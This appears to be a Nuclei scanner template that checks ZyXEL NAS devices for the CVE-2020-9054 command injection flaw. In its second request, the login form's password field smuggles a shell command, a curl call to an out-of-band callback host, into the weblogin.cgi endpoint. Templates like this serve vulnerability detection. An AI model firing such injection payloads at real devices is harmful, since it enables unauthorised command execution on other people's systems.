id: zyxel-nas-rce-cve-2020-9054

info:
  name: ZyXEL NAS Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Many ZyXEL products have operating system command injection vulnerabilities. Remote attackers can exploit this vulnerability to execute arbitrary code and gain server permissions with crafted HTTP POST or GET requests.
  classification:
    cve-id: CVE-2020-9054
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.0
  tags: command-execution,rce

variables:
  dnslog: "{{interactsh-url}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /cgi-bin/weblogin.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=asdf';curl {{dnslog}} #
    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: word
        part: interactsh_request
        words:
          - "curl"
